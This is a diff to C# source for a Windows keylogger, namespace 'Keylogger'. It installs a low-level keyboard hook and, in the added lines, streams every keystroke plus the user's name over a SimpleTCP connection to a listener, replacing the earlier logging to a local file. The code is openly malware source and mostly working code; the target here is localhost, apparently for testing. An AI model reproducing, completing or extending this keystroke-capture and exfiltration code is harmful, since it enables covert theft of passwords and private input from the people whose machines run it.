@@ -6,7 +6,7 @@ using System.Runtime.InteropServices;
 using System.Windows.Forms;
 using System.Drawing;
 using System.IO;
-
+using SimpleTCP;
 
 namespace Keylogger
 {
@@ -42,10 +42,28 @@ namespace Keylogger
 
         private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);
 
+        static SimpleTcpClient client;
+
         [STAThread]
         static void Main(string[] args)
         {
-            ShowWindow((IntPtr)GetConsoleWindow(), SW_HIDE);
+            ShowWindow((IntPtr)GetConsoleWindow(), SW_SHOW);
+
+            client = new SimpleTcpClient();
+            client.StringEncoder = Encoding.UTF8;
+            client.DataReceived += Client_DataReceived;
+            try
+            {
+                client.Connect("127.0.0.1", 8910);
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
+            }
+            finally
+            {
+                client.WriteLine($"{Environment.UserName}{Environment.NewLine}");
+            }
 
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -56,6 +74,11 @@ namespace Keylogger
 
             UnhookWindowsHookEx(_hookID);
 
+        }
+
+        private static void Client_DataReceived(object sender, SimpleTCP.Message e)
+        {
+            //throw new NotImplementedException();
         }
 
         private static IntPtr SetHook(LowLevelKeyboardProc proc)
@@ -73,7 +96,8 @@ namespace Keylogger
             {
                 int vkCode = Marshal.ReadInt32(lParam);
                 //Console.WriteLine((Keys)vkCode);
-                File.AppendAllText("Keylogger.txt", $"{(Keys)vkCode + Environment.NewLine}");
+                //File.AppendAllText("Keylogger.txt", $"{(Keys)vkCode + Environment.NewLine}");
+                client.WriteLine($"{(Keys)vkCode + Environment.NewLine}");
 
             }
             return CallNextHookEx(_hookID, nCode, wParam, lParam);
